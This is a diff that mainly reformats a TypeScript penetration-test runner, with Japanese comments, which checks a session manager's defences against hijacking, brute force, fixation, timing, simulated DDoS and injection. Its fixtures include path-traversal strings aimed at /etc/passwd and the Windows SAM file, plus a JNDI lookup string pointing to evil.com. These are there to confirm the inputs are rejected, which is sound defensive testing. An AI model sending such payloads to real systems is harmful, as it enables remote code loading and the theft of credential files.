@@ -85,7 +85,9 @@ export class PenetrationTestRunner {
           );
 
           // 位置異常が検知されるべき
-          const locationThreat = threats.find(t => t.type === 'location_anomaly');
+          const locationThreat = threats.find(
+            t => t.type === 'location_anomaly'
+          );
           return locationThreat !== undefined;
         },
       },
@@ -93,7 +95,8 @@ export class PenetrationTestRunner {
         name: 'User-Agent spoofing attack',
         scenario: async () => {
           const session = await this.createMockSession('user-456', {
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            userAgent:
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
           });
 
           // 全く異なるUser-Agentでアクセス
@@ -106,7 +109,9 @@ export class PenetrationTestRunner {
           );
 
           // セッションハイジャックが検知されるべき
-          const hijackThreat = threats.find(t => t.type === 'session_hijacking');
+          const hijackThreat = threats.find(
+            t => t.type === 'session_hijacking'
+          );
           return hijackThreat !== undefined;
         },
       },
@@ -118,8 +123,8 @@ export class PenetrationTestRunner {
         testName: `Session Hijacking - ${testCase.name}`,
         status: success ? 'pass' : 'fail',
         severity: success ? 'low' : 'high',
-        description: success 
-          ? '脅威が正常に検知されました' 
+        description: success
+          ? '脅威が正常に検知されました'
           : '脅威の検知に失敗しました',
         timestamp: new Date(),
       });
@@ -148,28 +153,43 @@ export class PenetrationTestRunner {
 
     for (const scenario of attackScenarios) {
       // 失敗ログインイベントを生成
-      const failedAttempts = Array.from({ length: scenario.attemptCount }, (_, i) => ({
-        event_type: 'login_failed' as const,
-        ip_address: targetIP,
-        created_at: new Date(Date.now() - (i * (scenario.timeWindowMinutes * 60 * 1000) / scenario.attemptCount)).toISOString(),
-      }));
+      const failedAttempts = Array.from(
+        { length: scenario.attemptCount },
+        (_, i) => ({
+          event_type: 'login_failed' as const,
+          ip_address: targetIP,
+          created_at: new Date(
+            Date.now() -
+              (i * (scenario.timeWindowMinutes * 60 * 1000)) /
+                scenario.attemptCount
+          ).toISOString(),
+        })
+      );
 
       // モックセッションでの分析
       const mockSession = await this.createMockSession('target-user', {
         ipAddress: targetIP,
       });
 
-      const threats = await this.securityMonitor.analyzeSessionActivity(mockSession, {
-        ipAddress: targetIP,
-        userAgent: 'AttackBot/1.0',
-      });
+      const threats = await this.securityMonitor.analyzeSessionActivity(
+        mockSession,
+        {
+          ipAddress: targetIP,
+          userAgent: 'AttackBot/1.0',
+        }
+      );
 
-      const bruteForceDetected = threats.find(t => t.type === 'brute_force_attack');
+      const bruteForceDetected = threats.find(
+        t => t.type === 'brute_force_attack'
+      );
       const expectedDetection = scenario.attemptCount >= 5; // 5回以上で検知されるべき
 
       this.recordResult({
         testName: `Brute Force - ${scenario.name}`,
-        status: (bruteForceDetected !== undefined) === expectedDetection ? 'pass' : 'fail',
+        status:
+          (bruteForceDetected !== undefined) === expectedDetection
+            ? 'pass'
+            : 'fail',
         severity: expectedDetection && !bruteForceDetected ? 'high' : 'low',
         description: `${scenario.attemptCount}回の試行、${scenario.timeWindowMinutes}分間: ${bruteForceDetected ? '検知済み' : '未検知'}`,
         timestamp: new Date(),
@@ -188,38 +208,41 @@ export class PenetrationTestRunner {
       const predefinedSessionToken = 'attacker-controlled-session-123';
 
       // 事前定義されたトークンでの認証試行（これは失敗するべき）
-      const validationResult = await this.sessionManager.validateSession(predefinedSessionToken);
+      const validationResult = await this.sessionManager.validateSession(
+        predefinedSessionToken
+      );
 
       this.recordResult({
         testName: 'Session Fixation Attack',
         status: !validationResult.isValid ? 'pass' : 'fail',
         severity: validationResult.isValid ? 'high' : 'low',
-        description: validationResult.isValid 
+        description: validationResult.isValid
           ? '事前定義セッションが受け入れられました（脆弱性あり）'
           : '事前定義セッションが正常に拒否されました',
         timestamp: new Date(),
       });
 
       // セッション再生成のテスト
-      const legitimateSession = await this.createMockSession('user-fixation-test');
+      const legitimateSession =
+        await this.createMockSession('user-fixation-test');
       const originalToken = 'original-session-token';
 
       // ログイン後のセッション再生成確認
       // 実装では新しいセッションIDが生成されるべき
-      const regeneratedSession = await this.createMockSession('user-fixation-test');
-      
+      const regeneratedSession =
+        await this.createMockSession('user-fixation-test');
+
       const tokensDifferent = legitimateSession.id !== regeneratedSession.id;
 
       this.recordResult({
         testName: 'Session Regeneration',
         status: tokensDifferent ? 'pass' : 'fail',
         severity: tokensDifferent ? 'low' : 'medium',
-        description: tokensDifferent 
+        description: tokensDifferent
           ? 'セッション再生成が正常に動作しています'
           : 'セッション再生成が実装されていません',
         timestamp: new Date(),
       });
-
     } catch (error) {
       this.recordResult({
         testName: 'Session Fixation Test',
@@ -248,7 +271,7 @@ export class PenetrationTestRunner {
       try {
         // CSRFトークンなしでの操作試行をシミュレート
         // 実際の実装では適切な検証が必要
-        
+
         this.recordResult({
           testName: `CSRF Protection - ${operation}`,
           status: 'manual_review_required',
@@ -278,7 +301,7 @@ export class PenetrationTestRunner {
     // 無効なセッションIDでの総当たり攻撃をシミュレート
     const invalidTokens = [
       'session-000001',
-      'session-000002', 
+      'session-000002',
       'session-999999',
       'admin-session-123',
       '../../../etc/passwd',
@@ -290,7 +313,7 @@ export class PenetrationTestRunner {
     for (const token of invalidTokens) {
       try {
         const result = await this.sessionManager.validateSession(token);
-        
+
         if (!result.isValid) {
           enumerationBlocked++;
         } else {
@@ -325,11 +348,15 @@ export class PenetrationTestRunner {
     console.log('⬆️ 権限昇格攻撃テスト...');
 
     // 低権限ユーザーでセッション作成
-    const lowPrivilegeSession = await this.createMockSession('staff-user', {}, 'staff');
+    const lowPrivilegeSession = await this.createMockSession(
+      'staff-user',
+      {},
+      'staff'
+    );
 
     // 管理者権限が必要な操作の試行をシミュレート
     // 実際の実装では権限チェックが必要
-    
+
     this.recordResult({
       testName: 'Privilege Escalation Prevention',
       status: 'manual_review_required',
@@ -369,7 +396,8 @@ export class PenetrationTestRunner {
       timingResults.push(Math.abs(validTime - invalidTime));
     }
 
-    const averageTimingDifference = timingResults.reduce((a, b) => a + b, 0) / timingResults.length;
+    const averageTimingDifference =
+      timingResults.reduce((a, b) => a + b, 0) / timingResults.length;
 
     this.recordResult({
       testName: 'Timing Attack Resistance',
@@ -396,7 +424,9 @@ export class PenetrationTestRunner {
 
     try {
       const results = await Promise.allSettled(sessionPromises);
-      const successfulSessions = results.filter(r => r.status === 'fulfilled').length;
+      const successfulSessions = results.filter(
+        r => r.status === 'fulfilled'
+      ).length;
       const expectedLimit = 5; // システムの制限値
 
       this.recordResult({
@@ -406,7 +436,6 @@ export class PenetrationTestRunner {
         description: `${successfulSessions}/${concurrentRequests} のセッションが作成されました`,
         timestamp: new Date(),
       });
-
     } catch (error) {
       this.recordResult({
         testName: 'Concurrent Session Attack',
@@ -431,13 +460,15 @@ export class PenetrationTestRunner {
         test: async () => {
           // セッショントークンのエントロピー分析
           const sessions = await Promise.all(
-            Array.from({ length: 100 }, () => this.createMockSession('entropy-test-user'))
+            Array.from({ length: 100 }, () =>
+              this.createMockSession('entropy-test-user')
+            )
           );
-          
+
           const tokens = sessions.map(s => s.id);
           const uniqueTokens = new Set(tokens);
           const entropyScore = this.calculateTokenEntropy(tokens);
-          
+
           return {
             passed: uniqueTokens.size === tokens.length && entropyScore > 4.0,
             score: entropyScore,
@@ -449,19 +480,19 @@ export class PenetrationTestRunner {
         name: 'Memory Leak Detection',
         test: async () => {
           const initialMemory = process.memoryUsage().heapUsed;
-          
+
           // 大量セッション作成・破棄
           for (let i = 0; i < 1000; i++) {
             const session = await this.createMockSession(`memory-test-${i}`);
             await this.sessionManager.validateSession(`test-token-${i}`);
           }
-          
+
           // ガベージコレクション実行
           if (global.gc) global.gc();
-          
+
           const finalMemory = process.memoryUsage().heapUsed;
           const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024; // MB
-          
+
           return {
             passed: memoryIncrease < 50, // 50MB未満
             memoryIncrease,
@@ -472,15 +503,17 @@ export class PenetrationTestRunner {
         name: 'Race Condition Detection',
         test: async () => {
           const userId = 'race-condition-test';
-          
+
           // 同時セッション作成競合状態テスト
           const promises = Array.from({ length: 10 }, () =>
             this.createMockSession(userId).catch(e => e)
           );
-          
+
           const results = await Promise.allSettled(promises);
-          const successes = results.filter(r => r.status === 'fulfilled').length;
-          
+          const successes = results.filter(
+            r => r.status === 'fulfilled'
+          ).length;
+
           return {
             passed: successes <= 5, // 制限内
             concurrentAttempts: 10,
@@ -498,10 +531,10 @@ export class PenetrationTestRunner {
             '${jndi:ldap://evil.com/exploit}',
             '../../../windows/system32/config/sam',
           ];
-          
+
           let bypassAttempts = 0;
           let blockedAttempts = 0;
-          
+
           for (const input of maliciousInputs) {
             try {
               const result = await this.sessionManager.validateSession(input);
@@ -514,7 +547,7 @@ export class PenetrationTestRunner {
               blockedAttempts++;
             }
           }
-          
+
           return {
             passed: bypassAttempts === 0,
             totalAttempts: maliciousInputs.length,
@@ -528,7 +561,7 @@ export class PenetrationTestRunner {
     for (const vulnTest of vulnerabilityTests) {
       try {
         const result = await vulnTest.test();
-        
+
         this.recordResult({
           testName: `Vulnerability Scan - ${vulnTest.name}`,
           status: result.passed ? 'pass' : 'fail',
@@ -561,22 +594,25 @@ export class PenetrationTestRunner {
         threshold: 50, // ms
         test: async () => {
           const measurements = [];
-          
+
           for (let i = 0; i < 100; i++) {
             const startTime = performance.now();
-            
+
             try {
               await this.sessionManager.validateSession(`perf-token-${i}`);
             } catch {}
-            
+
             const endTime = performance.now();
             measurements.push(endTime - startTime);
           }
-          
-          const averageTime = measurements.reduce((a, b) => a + b, 0) / measurements.length;
+
+          const averageTime =
+            measurements.reduce((a, b) => a + b, 0) / measurements.length;
           const maxTime = Math.max(...measurements);
-          const p95Time = measurements.sort((a, b) => a - b)[Math.floor(measurements.length * 0.95)];
-          
+          const p95Time = measurements.sort((a, b) => a - b)[
+            Math.floor(measurements.length * 0.95)
+          ];
+
           return {
             passed: averageTime < 50 && p95Time < 100,
             averageTime: Math.round(averageTime * 100) / 100,
@@ -591,23 +627,24 @@ export class PenetrationTestRunner {
         test: async () => {
           const session = await this.createMockSession('threat-perf-test');
           const measurements = [];
-          
+
           for (let i = 0; i < 50; i++) {
             const startTime = performance.now();
-            
+
             try {
               await this.securityMonitor.analyzeSessionActivity(session, {
                 ipAddress: '192.168.1.100',
                 userAgent: 'TestBrowser/1.0',
               });
             } catch {}
-            
+
             const endTime = performance.now();
             measurements.push(endTime - startTime);
           }
-          
-          const averageTime = measurements.reduce((a, b) => a + b, 0) / measurements.length;
-          
+
+          const averageTime =
+            measurements.reduce((a, b) => a + b, 0) / measurements.length;
+
           return {
             passed: averageTime < 200,
             averageTime: Math.round(averageTime * 100) / 100,
@@ -620,17 +657,19 @@ export class PenetrationTestRunner {
         test: async () => {
           const concurrentCount = 500;
           const startTime = performance.now();
-          
+
           const promises = Array.from({ length: concurrentCount }, (_, i) =>
-            this.sessionManager.validateSession(`load-token-${i}`).catch(() => null)
+            this.sessionManager
+              .validateSession(`load-token-${i}`)
+              .catch(() => null)
           );
-          
+
           await Promise.all(promises);
-          
+
           const endTime = performance.now();
           const totalTime = endTime - startTime;
           const averagePerRequest = totalTime / concurrentCount;
-          
+
           return {
             passed: averagePerRequest < 100 && totalTime < 5000, // 5秒以内
             totalTime: Math.round(totalTime),
@@ -644,7 +683,7 @@ export class PenetrationTestRunner {
     for (const perfTest of performanceTests) {
       try {
         const result = await perfTest.test();
-        
+
         this.recordResult({
           testName: `Performance Stress - ${perfTest.name}`,
           status: result.passed ? 'pass' : 'fail',
@@ -671,16 +710,20 @@ export class PenetrationTestRunner {
     console.log('🛡️ DDoS攻撃耐性テスト...');
 
     // 分散型攻撃をシミュレート
-    const attackIPs = Array.from({ length: 100 }, (_, i) => `203.0.113.${i + 1}`);
-    
+    const attackIPs = Array.from(
+      { length: 100 },
+      (_, i) => `203.0.113.${i + 1}`
+    );
+
     try {
       const attackPromises = attackIPs.map(async (ip, index) => {
         // 各IPから短時間で大量リクエスト
         const requests = Array.from({ length: 20 }, (_, reqIndex) =>
-          this.createMockSession(`ddos-user-${index}-${reqIndex}`, { ipAddress: ip })
-            .catch(() => null)
+          this.createMockSession(`ddos-user-${index}-${reqIndex}`, {
+            ipAddress: ip,
+          }).catch(() => null)
         );
-        
+
         return Promise.all(requests);
       });
 
@@ -688,7 +731,9 @@ export class PenetrationTestRunner {
       const results = await Promise.allSettled(attackPromises);
       const endTime = performance.now();
 
-      const successfulAttacks = results.filter(r => r.status === 'fulfilled').length;
+      const successfulAttacks = results.filter(
+        r => r.status === 'fulfilled'
+      ).length;
       const totalDuration = endTime - startTime;
 
       this.recordResult({
@@ -698,7 +743,6 @@ export class PenetrationTestRunner {
         description: `${successfulAttacks}/${attackIPs.length}のIP攻撃が成功、処理時間: ${Math.round(totalDuration)}ms`,
         timestamp: new Date(),
       });
-
     } catch (error) {
       this.recordResult({
         testName: 'DDoS Resistance Test',
@@ -732,7 +776,7 @@ export class PenetrationTestRunner {
       try {
         // セッショントークンとしてSQLペイロードを送信
         const result = await this.sessionManager.validateSession(payload);
-        
+
         if (result.isValid) {
           bypassAttempts++;
           this.recordResult({
@@ -782,7 +826,7 @@ export class PenetrationTestRunner {
       try {
         // XSSペイロードをセッショントークンとして送信
         const result = await this.sessionManager.validateSession(payload);
-        
+
         // ペイロードが処理された場合、適切にサニタイズされているかチェック
         if (payload.includes('<') && !result.reason?.includes('sanitized')) {
           potentialXSS++;
@@ -860,7 +904,7 @@ export class PenetrationTestRunner {
    */
   private recordResult(result: TestResult): void {
     this.testResults.push(result);
-    
+
     const emoji = {
       pass: '✅',
       fail: '❌',
@@ -876,13 +920,25 @@ export class PenetrationTestRunner {
    */
   private generateReport(): PentestReport {
     const totalTests = this.testResults.length;
-    const passedTests = this.testResults.filter(r => r.status === 'pass').length;
-    const failedTests = this.testResults.filter(r => r.status === 'fail').length;
-    const errorTests = this.testResults.filter(r => r.status === 'error').length;
-    const manualReviewTests = this.testResults.filter(r => r.status === 'manual_review_required').length;
+    const passedTests = this.testResults.filter(
+      r => r.status === 'pass'
+    ).length;
+    const failedTests = this.testResults.filter(
+      r => r.status === 'fail'
+    ).length;
+    const errorTests = this.testResults.filter(
+      r => r.status === 'error'
+    ).length;
+    const manualReviewTests = this.testResults.filter(
+      r => r.status === 'manual_review_required'
+    ).length;
 
-    const highSeverityIssues = this.testResults.filter(r => r.severity === 'high').length;
-    const mediumSeverityIssues = this.testResults.filter(r => r.severity === 'medium').length;
+    const highSeverityIssues = this.testResults.filter(
+      r => r.severity === 'high'
+    ).length;
+    const mediumSeverityIssues = this.testResults.filter(
+      r => r.severity === 'medium'
+    ).length;
 
     return {
       summary: {
@@ -911,7 +967,7 @@ export class PenetrationTestRunner {
     const recommendations = [];
 
     const failedTests = this.testResults.filter(r => r.status === 'fail');
-    
+
     if (failedTests.some(t => t.testName.includes('Session Hijacking'))) {
       recommendations.push('セッションハイジャック対策の強化が必要です');
     }
@@ -924,9 +980,13 @@ export class PenetrationTestRunner {
       recommendations.push('セッション固定攻撃対策の実装が必要です');
     }
 
-    const manualReviewTests = this.testResults.filter(r => r.status === 'manual_review_required');
+    const manualReviewTests = this.testResults.filter(
+      r => r.status === 'manual_review_required'
+    );
     if (manualReviewTests.length > 0) {
-      recommendations.push(`${manualReviewTests.length}項目の手動レビューが必要です`);
+      recommendations.push(
+        `${manualReviewTests.length}項目の手動レビューが必要です`
+      );
     }
 
     if (recommendations.length === 0) {
